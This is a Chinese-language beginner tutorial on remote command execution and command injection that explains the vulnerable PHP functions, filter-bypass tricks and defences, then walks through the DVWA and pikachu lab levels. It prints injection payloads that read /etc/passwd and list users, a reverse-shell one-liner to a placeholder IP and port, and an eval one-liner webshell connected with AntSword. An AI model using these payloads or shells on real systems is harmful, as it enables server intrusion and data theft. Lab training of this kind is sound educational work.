#  一篇文章带小白从原理到靶场练习搞懂RCE命令执行漏洞   
Cauchy  Cauchy网安   2025-05-12 03:05  
  
**命令执行漏洞**  
（Remote Command Execution, RCE）是指攻击者通过注入恶意命令，让目标服务器执行任意系统命令，从而控制服务器或获取敏感信息。  
### 一、RCE 攻击的原理  
  
RCE 漏洞的本质是：  
>   
> **服务器后端程序将用户输入的不可信数据拼接或传递给系统函数（如 system()、exec()、popen() 等）并执行。**  
  
  
Web 应用有时需要调⽤⼀些执行系统命令的函数，例如，如果想测试 www.xxx.com 是否可以正常连接，那么Web 应用底层就很可能去调用系统操作命令，如果此处没有过滤好用户输⼊的数据，就很有可能形成系统命令执行漏洞，使系统执行非预期的命令。  
### 二、常见触发函数（以 PHP 为例）  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 15px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">函数</span></section></th><th style="color: rgb(0, 0, 0);font-size: 15px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">system()</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">执行命令并输出结果</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">exec()</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">执行命令并返回最后一行</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">shell_exec()</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">执行命令并返回所有输出</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">passthru()</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">执行命令并直接输出原始数据</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">popen()</span></code><section><span leaf=""> / </span><code><span leaf="">proc_open()</span></code></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">打开进程的管道</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">backticks</span></code><font mstmutation="1" msttexthash="16177590" msthash="56021"><span leaf="">（`ls`）</span></font></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">执行命令并返回结果</span></section></td></tr></tbody></table>  
  
其他语言也有类似函数，例如：  
- Python ：、os.system()subprocess.*  
  
- Java ：Runtime.getRuntime().exec()  
  
### 三、攻击方式分类  
#### 1. 直接命令注入  
  
**示例代码（PHP）：**  
```
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>

```  
  
**利用方式：**  
```
http://example.com/vuln.php?cmd=ls

```  
#### 2. 命令拼接  
  
**如果用户输入被拼接到命令中：**  
```
$ip = $_GET['ip'];
system("ping " . $ip);

```  
  
**攻击者输入：**  
```
127.0.0.1; cat /flag

```  
  
**执行命令：**  
```
ping 127.0.0.1; cat /flag

```  
### 四、常用绕过技术（过滤/黑名单绕过）  
1. **空格绕过：**  
  
1. 使用${IFS}$IFS\t\n  
  
1. 如：ping${IFS}127.0.0.1  
  
1. **字符编码绕过：**  
  
1. URL 编码、Unicode 编码等  
  
1. **命令替代：**  
  
1. $(command)、`command`  
  
1. 利用 shell 特性：如 、、、|&&||;  
  
1. **双重编码或截断：**  
  
1. %2520 解码两次为 （空格）%20  
  
1. **环境变量与别名替代：**  
  
1. 使用  之类的路径直接执行/bin/sh  
  
1. 使用环境变量绕过路径限制  
  
### 五、利用目的  
- 查看敏感文件（如 、）/etc/passwd/flag  
  
- 反弹 Shell (bash -i >& /dev/tcp/IP/PORT 0>&1  
)  
  
- 安装木马、远控  
  
- 横向移动或提权  
  
### 六、防御措施  
- **永远不要信任用户输入**  
  
- 对参数进行**白名单校验**  
  
- 避免使用系统命令，使用语言自带功能替代  
  
- 最小权限原则：Web 服务用户权限最小化  
  
- 使用 WAF 检测异常请求  
  
# DVWA 靶场的 Command Injection（命令注入）模块。  
## low级别  
  
1.先从Low级别开始，low级别的代码接收了用户输⼊的ip，服务器通过判断操作系统执行不同 ping 命令。但是这⾥对⽤户输⼊的 ip 并没有进行任何的过滤，所以存在可利⽤的命令执行漏洞。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAM5N0ok7icP1OfQN3icdtnedjWO9H6CuQAWiaw9tDIYmjwLwva7Z4T0www/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAZQsGxFYncRrib1t9r6oLKnmcknG0qHSRAyS6TnNhKKrdiaMMk3qB4Idw/640?wx_fmt=jpeg&from=appmsg "")  
  
## 漏洞点分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAb7egDNUDiaicvJkmXUpdhY3BXV0AFyGiarnwgYASzFl2YYTlNcLWnpjlw/640?wx_fmt=png&from=appmsg "")  
  
**代码关键部分：**  
```
$target = $_REQUEST[ 'ip' ]; 
...
$cmd = shell_exec( 'ping  -c 4 ' . $target );

```  
- 用户可控参数  被直接拼接到 shell 命令中，然后传给  函数。$targetshell_exec()  
  
- 没有任何过滤或验证。  
  
- 攻击者可构造输入，如：，让系统执行多个命令。127.0.0.1; cat /etc/passwd  
  
## 利用方式示例  
  
⽤&&来执行多条命令，构造 payload（有效载荷）：  
```
127.0.0.1&&net user

```  
- &&是 shell 运算符，表示前一个命令成功时才执行后一个命令。  
  
- 127.0.0.1 是合法的 IP，会使 ping 正常执行。  
  
- net user 是 Windows 命令，列出系统所有用户。 如果执行环境是 Windows，会泄露当前系统的用户名信息。 如果是Linux，net user 会报错，但可以用 **&& cat /etc/passwd**  
 等命令替代。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHATHj3oJ0JGMddIr4aQ01v93l0mb7jEQTQUOsicJpTve0rqxiaOm9HCo4A/640?wx_fmt=png&from=appmsg "")  
出现中文乱码的现象，我们先修改一下靶机的语言配置  
  
**方法一：**  
- 按住win+r，在运行框中输入cmd弹出命令行，在命令行中输入“control intl.cpl”  
  
- 我们将它改成英语并重新启动即可（重启后记得打开PHP和MySQL服务）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAljAichrzplqOicZq7YVvsnTicwia860MI8uOjnMoibCahdUTkxUwsicuyrjA/640?wx_fmt=png&from=appmsg "")  
  
重新输入发现没有中文乱码  
```
127.0.0.1 & ipconfig

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAcMBWShHsibmmEHMoGj9BO7wNueVr3LiaEZYyflWZBwCbgp9oicJbfQMeg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAwMnKAticr2JccOicUph6XDYI4mL9xN7y7QVhp6LM3LEeQXmZrQJDkrKw/640?wx_fmt=png&from=appmsg "")  
**方法二**  
  
把 DVWA\dvwa\includes ⽬录下的 dvwaPage.inc.php ⽂件中所有的“charset=utf-8”，全部替换修改为“charset=gb2312”即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAiapJG8yXEXPLh1rStBYuFEhmA7Q9IblrzRiabWwlrtLlm6fibBsF4hU3w/640?wx_fmt=png&from=appmsg "")  
## medium级别  
  
看一下源代码，发现&&和;被过滤掉了  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAYvGXNicm5ySw8ZOlghCYvLG7ic2dwdoEKJqIWVO3IjwlflTqyAZLd1Ng/640?wx_fmt=jpeg&from=appmsg "")  
  
  
不用&&，直接用&就可以！&&和&的区别在于 &&是执行完前面的命令然后执行后面的命令，&是不管前面的命令是否值执行，后面的都执行。  
```
构造 poyload： 127.0.0.1 & ipconfig

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAyvq8w0FVy03U6f3eulgms6s9AL6XKxBkmqibyEET6fnFXcAoibHOLnfA/640?wx_fmt=png&from=appmsg "")  
## high级别  
  
查看一下源代码，发现相⽐于前⾯两个等级的，high 等级的⿊名单更完善了，但是由于只是过滤掉了 “| ” ，如果⽤ | 后不跟空格就可以绕过过滤  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAP96LjP9fsGYXAHekWMUBnX99aPgysTWZuLHO6RBw23wBekm8MZlUDA/640?wx_fmt=png&from=appmsg "")  
  
```
 127.0.0.1|net user

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAZSm1gcE32xsxWGOzgGHmiaMIJIskgibGRIMzaoMdnIpqicPUHz45sYvmg/640?wx_fmt=png&from=appmsg "")  
# pikachu 靶场的 Command Injection（命令注入）模块。  
## exec ping关卡  
  
pikachu 靶场同样提供了测试域名/IP 的 Ping 功能（命令执行漏洞模块)，并将 Ping 命令的执行过程显示出来。下面测试域名：www.baidu.com 是否可以正常连接，如图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAQ9DkMAZGIEcnjrsSuJOGV86q3l6W9hC5SQCI21e17TGnUBmmAjNCnw/640?wx_fmt=png&from=appmsg "")  
  
先看一下源代码，没有发现被过滤的命令  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHATePs7WK5C8G7lg4xxM2ibX5mib6uTehKtSKD8I33iaRmtzz3fDj2EBGzA/640?wx_fmt=png&from=appmsg "")  
  
```
查看一下ip:
127.0.0.1 & ipconfig

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHA8maJgQ0EdIp0QdxXRvReNXAtEeOcASckQiaEF6cEDh4Jy9sYrQjian3Q/640?wx_fmt=png&from=appmsg "")  
我们可以执行其他命令了，在很多时候打靶场我们都会利用rce来反弹监听。在知道了系统命令可以连接执行后，如果 Web 应用程序没有过滤好输入，就变得相当危险。常用的命令连接符：  
## Windows 和 Linux 都支持的连接符：  
```
A|B   只执行 B
A||B  如果 A 执行出错，则执行 B,如果A执行成功就不执行B
A&B   先执行 A，不管是否成功，都会执行 B
A&&B  先执行 A，执行成功后执行 B，否则不执行B
A;B   先执行 A，再执行B(只有Linux⽀持的连接符)

```  
  
**A|B**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAr4s0NqIVXONp9BAxice9eibexiazTwLoUnwRAzoSZxKH0YS2jbBsx0Aow/640?wx_fmt=png&from=appmsg "")  
**A||B**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAMZcXrocOZ5bla6T2jHQxiavqb1Z5xdnSvbAia0K86EJA5CXibqrbNAib2Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAuCOySDicDW8U2NcqrMO3iaqTicjvnibT73fv8pXntne5phTAQJRVOh3icjQ/640?wx_fmt=png&from=appmsg "")  
  
**A&B**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHANaDkib2biaePKwXNcicoJgYJoUJFxKjkWcx6GEoibiaDtDNTUNOmcPKzDGA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAq2mMJNDIpTv0GUiaX3XYQiajwrgflollCn9SkEH0W4M7zOPj2aYk1Dww/640?wx_fmt=png&from=appmsg "")  
  
**A&&B**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAEujoT1ge2Q7Q359pK3Jut0G2iakTYq395NwmUpX8gMYjtvK3TNqqDBw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHA2ibibPouxyeQStFTaZSibxqhzMhVE3iboBV81RxibK3xjeGzXgx2zXbaWag/640?wx_fmt=png&from=appmsg "")  
## exec "eval"代码执行漏洞关卡  
  
代码注入攻击与命令注入攻击不同。因为需求设计，后台有时候需要把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。  
  
**以pikachu为例**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAtWa20wbRwwTfaE80qc78b6vI9Fiayjo5m94fuMZH91ojwU4uPnibTrRw/640?wx_fmt=png&from=appmsg "")  
```
输⼊ phpinfo();(注意要带上分号)

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHA72BCPaYicwHLwPM71oAjtkZ3KoFDztXCaVvFOSLQY3mRpwZhZoarXnQ/640?wx_fmt=png&from=appmsg "")  
发现直接执行了我们输入的代码。我们看一下源代码，查看代码发现是 eval()函数执行了我们的提交参数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHAbd6NRTF3qq16Cc6EvVb1icbMaj1aPl6T9P84FHvFic4Yoczxx8HJYpLA/640?wx_fmt=png&from=appmsg "")  
  
既然能执行eval(),那我们可以利用蚁剑构造一句话木马连接  
```
$_POST['txt']
```  
  
用蚁剑添加body表单字段，这里要注意的是编码器和解析器都选择base64，否则连接返回的数据为空  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHA9f0Jt4EibGsOjQE1ou9lJgqBhrn6Re2TGUA5mjyr76TDiaKzvsMlrFqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHA57CFNpauNGyuBibAAkZv8lSAucHJOS1eRzrvfPfftbpmutBvDrJe2cw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkRLGghDq1eNLnDOCuIibgBHA9pIkm7ggJLE8ekW3ECMY5slCKTaAtG2mBZib6ADZLJsxq2Av1kbMlug/640?wx_fmt=png&from=appmsg "")  
成功利用远程代码漏洞进入对方主机，如果需要提权，可以利用蚁剑连接的前提反弹监听,进一步进行渗透  
  
  
